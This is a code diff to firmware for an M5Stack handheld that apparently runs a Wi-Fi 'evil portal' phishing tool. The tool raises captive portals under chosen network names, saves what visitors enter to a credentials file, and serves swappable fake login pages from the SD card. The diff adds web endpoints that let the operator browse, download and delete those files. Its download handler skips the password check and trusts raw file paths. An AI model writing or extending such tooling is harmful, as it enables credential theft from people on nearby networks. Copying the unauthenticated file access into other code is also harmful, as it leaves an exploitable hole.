@@ -113,7 +113,7 @@ void setup() {
     "Quantum Algorithm started",
     "Digital Footprint Erased.",
     "   Uploading Virus...",
-    "Downloading Intenret...",
+    "Downloading Internet...",
     "  Root Access Granted.",
     "Cyberpunk Mode: Engaged.",
     "  Zero Days Exploited.",
@@ -419,7 +419,6 @@ void showWifiDetails(int networkIndex) {
     M5.Display.setTextSize(2);
     int y = 10; 
 
-    // Afficher le SSID
     M5.Display.setCursor(10, y);
     M5.Display.println("SSID: " + ssidList[networkIndex]);
     y += 40;
@@ -516,20 +515,28 @@ void createCaptivePortal() {
     });
     
     server.on("/credentials", HTTP_GET, []() {
-        String password = server.arg("pass");
-        if (password == accessWebPassword) {
-            File file = SD.open("/credentials.txt");
-            if (file) {
-                server.streamFile(file, "text/plain");
-                file.close();
+    String password = server.arg("pass");
+    if (password == accessWebPassword) {
+        File file = SD.open("/credentials.txt");
+        if (file) {
+            if (file.size() == 0) {
+                server.send(200, "text/plain", "No credentials...");
             } else {
-                server.send(404, "text/plain", "File not found");
+                server.streamFile(file, "text/plain");
             }
+            file.close();
         } else {
-            server.send(403, "text/plain", "Unauthorized");
+            server.send(404, "text/plain", "File not found");
         }
-    });
+    } else {
+        server.send(403, "text/plain", "Unauthorized");
+    }
+});
 
+    
+    server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
+    server.on("/download-sd-file", HTTP_GET, handleFileDownload);
+    
       server.on("/uploadhtmlfile", HTTP_GET, []() {
       if (server.arg("pass") == accessWebPassword) {
         String html = "<form method='post' enctype='multipart/form-data' action='/upload'>";
@@ -545,6 +552,8 @@ void createCaptivePortal() {
       server.send(200);
     }, handleFileUpload);
 
+    server.on("/delete-sd-file", HTTP_GET, handleFileDelete);
+
 
 
     server.onNotFound([]() {
@@ -555,6 +564,90 @@ void createCaptivePortal() {
     waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
 }
 
+
+String getDirectoryHtml(File dir, String path, String password) {
+    String html = "<ul>";
+    if (path != "/") {
+        String parentPath = path.substring(0, path.lastIndexOf('/'));
+        if (parentPath == "") parentPath = "/";
+        html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
+    }
+    
+    while (File file = dir.openNextFile()) {
+        String fileName = String(file.name());
+        String displayFileName = fileName;
+        if (path != "/" && fileName.startsWith(path)) {
+            displayFileName = fileName.substring(path.length());
+            if (displayFileName.startsWith("/")) {
+                displayFileName = displayFileName.substring(1);
+            }
+        }
+
+        String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
+        if (!fullPath.startsWith("/")) {
+            fullPath = "/" + fullPath;
+        }
+
+        if (file.isDirectory()) {
+            html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
+        } else {
+            html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
+        }
+        file.close();
+    }
+    html += "</ul>";
+
+    html += "<script>"
+            "function confirmDelete(filename) {"
+            "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
+            "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
+            "  }"
+            "}"
+            "</script>";
+
+    return html;
+}
+
+
+void handleSdCardBrowse() {
+    String password = server.arg("pass");
+    if (password != accessWebPassword) {
+        server.send(403, "text/plain", "Unauthorized");
+        return;
+    }
+
+    String dirPath = server.arg("dir");
+    if (dirPath == "") dirPath = "/";
+
+    File dir = SD.open(dirPath);
+    if (!dir || !dir.isDirectory()) {
+        server.send(404, "text/plain", "Directory not found");
+        return;
+    }
+
+    String html = getDirectoryHtml(dir, dirPath, accessWebPassword);
+    server.send(200, "text/html", html);
+    dir.close();
+}
+
+void handleFileDownload() {
+    String fileName = server.arg("filename");
+    if (!fileName.startsWith("/")) {
+        fileName = "/" + fileName;
+    }
+    if (SD.exists(fileName)) {
+        File file = SD.open(fileName, FILE_READ);
+        if (file) {
+            String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
+            server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
+            server.streamFile(file, "application/octet-stream");
+            file.close();
+            return;
+        }
+    }
+    server.send(404, "text/plain", "File not found");
+}
+
 void handleFileUpload() {
     HTTPUpload& upload = server.upload();
     if (upload.status == UPLOAD_FILE_START) {
@@ -563,17 +656,15 @@ void handleFileUpload() {
         filename.replace("\\", "");
         if (!filename.startsWith("/sites/")) filename = "/sites/" + filename;
 
-        // Ouvrir le fichier pour écriture
+
         fsUploadFile = SD.open(filename, FILE_WRITE);
         Serial.print("Upload Start: ");
         Serial.println(filename);
     } else if (upload.status == UPLOAD_FILE_WRITE) {
-        // Écrire les données dans le fichier
         if (fsUploadFile) {
             fsUploadFile.write(upload.buf, upload.currentSize);
         }
     } else if (upload.status == UPLOAD_FILE_END) {
-        // Fermer le fichier lorsque le téléversement est terminé
         if (fsUploadFile) {
             fsUploadFile.close();
             Serial.print("Upload End: ");
@@ -582,6 +673,29 @@ void handleFileUpload() {
         } else {
             server.send(500, "text/plain", "500: couldn't create file");
         }
+    }
+}
+
+
+void handleFileDelete() {
+    String password = server.arg("pass");
+    if (password != accessWebPassword) {
+        server.send(403, "text/plain", "Unauthorized");
+        return;
+    }
+
+    String fileName = server.arg("filename");
+    if (!fileName.startsWith("/")) {
+        fileName = "/" + fileName;
+    }
+    if (SD.exists(fileName)) {
+        if (SD.remove(fileName)) {
+            server.send(200, "text/plain", "File deleted successfully");
+        } else {
+            server.send(500, "text/plain", "File could not be deleted");
+        }
+    } else {
+        server.send(404, "text/plain", "File not found");
     }
 }
 
@@ -642,8 +756,7 @@ void changePortal() {
     M5.Display.println("Select Portal:");
 
     int displayLimit = min(numPortalFiles, 10);
-
-    // Afficher les noms de fichier
+    
     for (int i = 0; i < displayLimit; i++) {
         int displayIndex = (topVisibleIndex + i) % numPortalFiles;
         M5.Display.setCursor(10, 30 + i * 20);
@@ -673,8 +786,6 @@ void changePortal() {
         }
     }
 }
-
-
 
 String credentialsList[100]; // max 100 lignes parsed
 int numCredentials = 0; 
